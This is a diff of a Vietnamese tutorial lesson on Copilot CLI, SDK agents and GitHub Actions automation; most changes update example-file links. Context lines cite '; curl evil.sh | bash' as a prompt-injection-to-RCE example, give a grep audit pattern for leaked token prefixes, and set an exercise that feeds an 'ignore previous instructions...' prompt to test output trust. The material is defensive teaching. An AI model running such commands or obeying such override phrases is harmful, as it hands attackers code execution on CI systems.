@@ -58,7 +58,7 @@ Copilot CLI đưa agent vào terminal: agentic workflows, nhiều model, tích h
 - **Trong CI: không bao giờ `eval` output của Copilot** — log/issue chứa `; curl evil.sh | bash` là prompt-injection thành RCE; ghi ra file, có người duyệt, mỗi step có timeout.
 - `gh copilot suggest/explain` là **extension cộng đồng của GitHub CLI** (không thuộc docs Copilot), chỉ gợi ý/giải thích lệnh shell — đừng dạy nó là Copilot CLI. Repo có [cli-suggest](commands/local/system-knowledge/cli-suggest/README.md) · [cli-explain](commands/local/system-knowledge/cli-explain/README.md) ghi rõ nguồn gốc.
 
-> 📄 **Code ví dụ:** [`examples/12-2-copilot-cli-automation.sh`](examples/12-2-copilot-cli-automation.sh)
+> 📄 **Code ví dụ:** [`./examples/12-copilot-sdk-ci-cd-automation/copilot-cli-automation.sh`](./examples/12-copilot-sdk-ci-cd-automation/copilot-cli-automation.sh)
 
 > **Tóm gọn 1 câu:** CLI đưa agent vào terminal — nhưng trong CI thì output của nó chỉ là *gợi ý*: ghi file, người duyệt, timeout, check exit code.
 
@@ -91,7 +91,7 @@ await session.close();
 - **Khi nào chọn gì:** việc thường trong pipeline → CLI hoặc giao **Copilot cloud agent** (mục 6); quy trình đặc thù cần tool/UI riêng lồng backend → mới tới SDK; cần agent trên GitHub mà không giữ máy bật → cloud agent.
 - **Verify mẫu chạy được:** `export GITHUB_TOKEN="$(gh auth token)"` → `npx tsx examples/copilot-review.ts` → terminal in 5–10 dòng findings; thử prompt "xoá hết files" → từ chối vì allowlist hẹp.
 
-> 📄 **Code ví dụ:** [`examples/01-2-copilot-sdk-build-agent-rieng.ts`](examples/01-2-copilot-sdk-build-agent-rieng.ts) (bản đầy đủ) · [`examples/02-2-copilot-sdk-build-agent-rieng.sh`](examples/02-2-copilot-sdk-build-agent-rieng.sh) (chạy + verify)
+> 📄 **Code ví dụ:** [`./examples/02-cac-be-mat-vscode-ide-web-cli/copilot-sdk-build-agent-rieng.ts`](./examples/02-cac-be-mat-vscode-ide-web-cli/copilot-sdk-build-agent-rieng.ts) (bản đầy đủ) · [`./examples/02-cac-be-mat-vscode-ide-web-cli/copilot-sdk-build-agent-rieng.sh`](./examples/02-cac-be-mat-vscode-ide-web-cli/copilot-sdk-build-agent-rieng.sh) (chạy + verify)
 
 ## 4. Routine ca đêm: triage CI fail (GitHub Actions)
 
@@ -105,13 +105,13 @@ Nightly triage — luồng 4 bước (workflow đầy đủ ở examples):
 4. github-script mở issue gom report → on-call sáng đọc, quyết định fix.
 ```
 
-> 📄 **Code ví dụ (copy-paste vào `.github/workflows/`):** [`examples/12-4-routine-triage.yml`](examples/12-4-routine-triage.yml) — có `workflow_dispatch` để chạy tay từng bước trước khi tin schedule.
+> 📄 **Code ví dụ (copy-paste vào `.github/workflows/`):** [`./examples/12-copilot-sdk-ci-cd-automation/routine-triage.yml`](./examples/12-copilot-sdk-ci-cd-automation/routine-triage.yml) — có `workflow_dispatch` để chạy tay từng bước trước khi tin schedule.
 
 ## 5. Gate code-quality cho PR mới (workflow + Rulesets)
 
 Workflow thứ hai biến Copilot thành "trực cửa PR": mỗi PR mở/sửa → request **Copilot code review** + comment diff-stat cho người review.
 
-> 📄 **Code ví dụ:** [`examples/12-5-workflow-code-quality.yml`](examples/12-5-workflow-code-quality.yml)
+> 📄 **Code ví dụ:** [`./examples/12-copilot-sdk-ci-cd-automation/workflow-code-quality.yml`](./examples/12-copilot-sdk-ci-cd-automation/workflow-code-quality.yml)
 
 Dựng gate thành quy tắc repo (Settings → Rules → **Rulesets** — chủ sở hữu: bài 15): **Require Copilot code review: ON** · required checks (lint, test): ON · dismiss stale reviews: ON. Giữ gate sống được thì lo **precision**:
 
@@ -129,7 +129,7 @@ Dựng gate thành quy tắc repo (Settings → Rules → **Rulesets** — chủ
 - Package plan: session cloud của plan trả phí có mặc định cao hơn Free **10×** và thêm **100 MB Artifact** (as of 11/2026 — bảng plan ở bài 01/14).
 - **Tin tốt 2026:** agent khởi động tới lúc mở PR draft nhanh hơn ~50% (changelog, as of 11/2026 — docs không chốt con số này, coi là tham khảo).
 
-**Quy tắc assign (dán vào CONTRIBUTING):** 1 issue = 1 task độc lập + acceptance criteria đo được + non-goals rõ; có label **"ready"** mới assign; agent iterate tối đa **3 rounds** (quá thì close + chia nhỏ); PR của agent review như PR người (diff + CI + Copilot review + 1 human approve). Chi tiết giao việc: [commands/cloud/model-agent/coding-agent-assign](commands/cloud/model-agent/coding-agent-assign/README.md) · [coding-agent-pr](commands/cloud/model-agent/coding-agent-pr/README.md) · mẫu issue: [`examples/06-5-1-assign-issue-chat-luong-pr-chat.sh`](examples/06-5-1-assign-issue-chat-luong-pr-chat.sh).
+**Quy tắc assign (dán vào CONTRIBUTING):** 1 issue = 1 task độc lập + acceptance criteria đo được + non-goals rõ; có label **"ready"** mới assign; agent iterate tối đa **3 rounds** (quá thì close + chia nhỏ); PR của agent review như PR người (diff + CI + Copilot review + 1 human approve). Chi tiết giao việc: [commands/cloud/model-agent/coding-agent-assign](commands/cloud/model-agent/coding-agent-assign/README.md) · [coding-agent-pr](commands/cloud/model-agent/coding-agent-pr/README.md) · mẫu issue: [`./examples/02-cac-be-mat-vscode-ide-web-cli/assign-issue-chat-luong-pr-chat.sh`](./examples/02-cac-be-mat-vscode-ide-web-cli/assign-issue-chat-luong-pr-chat.sh).
 
 Giao nhiều issue cùng lúc (fan-out) — ba gạch thuộc bài 06 (chủ sở hữu song song): mỗi agent một **vùng code riêng**, issue ghi phạm vi rõ; lane `copilot/*` vs `feat/*` ở bài 11 §5; gộp PR nào merge trước thì rebase các PR còn lại.
 
@@ -166,8 +166,8 @@ Audit: grep -rniE "ghp_|gho_|sk-|xox_" examples/ .github/workflows/ → phải T
 
 ## Bài tập
 
-1. **(10 phút)** Chạy 3 lệnh trong [`examples/12-2-copilot-cli-automation.sh`](examples/12-2-copilot-cli-automation.sh) (session tương tác + `--plan` + `-p`); thử đưa 1 prompt độc "ignore previous instructions..." qua `-p` rồi ghi lại kết luận output có đáng tin không.
-2. **(15 phút)** Deploy [`examples/12-4-routine-triage.yml`](examples/12-4-routine-triage.yml) lên repo test, bấm `workflow_dispatch`, đọc issue nó mở — rồi bật schedule.
+1. **(10 phút)** Chạy 3 lệnh trong [`./examples/12-copilot-sdk-ci-cd-automation/copilot-cli-automation.sh`](./examples/12-copilot-sdk-ci-cd-automation/copilot-cli-automation.sh) (session tương tác + `--plan` + `-p`); thử đưa 1 prompt độc "ignore previous instructions..." qua `-p` rồi ghi lại kết luận output có đáng tin không.
+2. **(15 phút)** Deploy [`./examples/12-copilot-sdk-ci-cd-automation/routine-triage.yml`](./examples/12-copilot-sdk-ci-cd-automation/routine-triage.yml) lên repo test, bấm `workflow_dispatch`, đọc issue nó mở — rồi bật schedule.
 3. **(10 phút)** Viết 1 issue "ready" đủ format mục 6, gán label ready, assign Copilot cloud agent; review PR draft từ đầu tới trước merge (KHÔNG bấm merge — để nguyên cho phiên sau).
 
 ## Link qua
